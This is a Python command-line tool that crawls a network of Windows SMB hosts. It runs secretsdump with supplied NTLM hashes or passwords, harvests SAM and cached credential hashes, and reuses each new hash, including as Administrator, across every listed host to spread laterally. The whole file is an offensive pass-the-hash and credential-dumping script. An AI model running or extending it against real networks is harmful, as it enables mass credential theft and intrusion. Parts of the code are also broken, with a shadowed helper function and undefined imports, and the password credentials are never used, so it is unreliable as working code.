#!/usr/bin/env python3
import os
from pathlib import Path
import shlex
import re
import logging
from typing import Callable
from itertools import product
import pprint
import subprocess

import click
import networkx as nx

from .toolz import (
    pipe, curry, dissoc, merge, map, filter,
    vmapcat, shuffled, vfilter, get_ips_from_file,
)
from . import logging
# from .config import site_config

log = logging.new_log(__name__)

sam_re = re.compile(
    r'^(.*?):\d+:(\w+:\w+):::$', re.M,
)
mscache_re = re.compile(
    r'^(.+?)/(.+?):(\$.*?\$.*?#.*?#.*?)$', re.M,
)

def get_outpath(parent_ip, ip, user):
    return Path(host_dir(ip), f'secretsdump-{parent_ip}-{user}.txt')

@curry
def secretsdump(secretsdump_exec, parent_ip, user, ip,
                hashes=None, password=None):
    command = (
        f"{secretsdump_exec} -hashes {hashes} '{user}@{ip}'"
        if hashes else
        f"{secretsdump_exec} '{user}:{password}@{ip}'"
    )
    pipe = subprocess.Popen(
        shlex.split(command),
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        env=os.environ.copy(),
    )
    stdout, _ = pipe.communicate()
    output = stdout.decode()

    sam = pipe(
        sam_re.findall(output),
        vfilter(lambda u, h: u.lower() != 'guest'),
        tuple,
    )

    if sam:
        outpath = get_outpath(parent_ip, ip, user)
        content = outpath.read_text() if outpath.exists() else ''
        outpath.write_text(
            f"{content}\n\n{'-'*80}\n{hashes}\n{'-'*80}\n\n{output}"
        )

    return sam

def inputs_to_args(inputs):
    return pipe(
        ['parent_ip', 'ip', 'user', 'password', 'hashes'],
        filter(lambda key: key in inputs),
        map(lambda key: (key, inputs[key])),
        dict,
    )

@curry
def worker(secretsdump: Callable, seen: set, queue, ips):
    graph = nx.DiGraph()
    while True:
        inputs = queue.get()
        parent_ip = inputs.get('parent_ip')
        child_ip = inputs['ip']
        args = inputs_to_args(inputs)
        log.info(f"IP: {args['ip']} User: {args['user']}")

        sam = secretsdump(**args)

        if sam:
            log.info(f"Found SAM for IP {args['ip']} and"
                     f" User: {args['user']}"
                     f"\n{pprint.pformat(sam)}")
            graph.add_edge(
                parent_ip, child_ip,
                **merge(
                    dissoc(args, 'parent_ip', 'ip'),
                    {'sam': sam},
                )
            )

            for ip, (u, h) in pipe(set(product(ips, sam)) - seen, shuffled):
                queue.put({'parent_ip': child_ip, 'ip': ip,
                           'user': u, 'hashes': h})
                if u.lower() != 'administrator':
                    queue.put({'parent_ip': child_ip, 'ip': ip,
                               'user': 'Administrator', 'hashes': h})
                # seen_sem.acquire()
                # log.debug('Acquired seen lock')
                seen.add((ip, (u, h)))
                # seen_sem.release()
                # log.debug('Released seen lock')

        queue.task_done()

def start_crawl(root_ip, ips, creds, hashes):
    config = site_config()
    queue = gevent.queue.JoinableQueue()
    hashes = pipe(
        hashes,
        # Remove Guest account
        vfilter(lambda u, h: u.lower() != 'guest'),
        # Copy non-admin hashes as Admin hash (i.e. pw reuse)
        vmapcat(
            lambda u, h: (
                ((u, h), ('Administrator', h))
                if u.lower() != 'administrator' else
                ((u, h),)
            )
        ),
        tuple,
    )
    seen = set(product(ips, hashes))
    for i in range(10):
        gevent.spawn(
            worker, secretsdump(config['secretsdump']['exec']),
            seen, queue, ips
        )

    for ip, (u, h) in pipe(product(ips, hashes), shuffled):
        queue.put({'user': u, 'hashes': h,
                   'parent_ip': root_ip, 'ip': ip})

    queue.join()

@click.command()
@click.option(
    '-i', '--ip-path',
    help='Input file with IPs to crawl',
    type=click.Path(exists=True), default='smb-hosts.txt',
)
@click.option(
    '-C', '--creds-file',
    help='File with credentials in (user<TAB>pass) form',
    type=click.Path(exists=True),
)
@click.option(
    '-H', '--hashes-file',
    help='File with hashes, one per line',
    type=click.Path(exists=True),
)
@click.option(
    '-R', '--root-ip',
    help=('Optional root IP from which the original'
          ' hashes/passwords originated'),
)
@click.option(
    '--loglevel', default='info',
)
def secrets_crawl(ip_path, creds_file, hashes_file, root_ip, loglevel):
    '''Given a list of IPs (-i) to search for secrets (default:
    ./smb-hosts.txt) and either a file with a list of credentials (-C,
    in user<TAB>pass form) or a file with a list of NTLM hashes (-H,
    must contain user and hash, one per line), use all
    credentials/hashes to find secrets using secretsdump.

    Optionally, can provide a --root-ip from which the original
    credentials/hashes came.

    '''
    setup_logging(loglevel)
    
    ips = get_ips_from_file(ip_path)
    log.info(f'{len(ips)} IPs')
    
    creds = pipe(
        Path(creds_file).read_text().splitlines(),
        map(lambda line: line.split('\t')),
        tuple,
    ) if creds_file else []
    log.info(f'{len(creds)} password credentials')

    hashes = pipe(
        Path(hashes_file).read_text().splitlines(),
        filter(lambda line: not line.startswith('#')),
        map(lambda line: sam_re.search(line).groups()),
        set,
        sorted,
    ) if hashes_file else []
    log.info(f'{len(hashes)} hashes')

    if not (creds or hashes):
        raise click.UsageError(
            'Must provide either credentials (-C) or hashes (-H)'
        )

    start_crawl(root_ip, ips, creds, hashes)

if __name__ == '__main__':
    secrets_crawl()
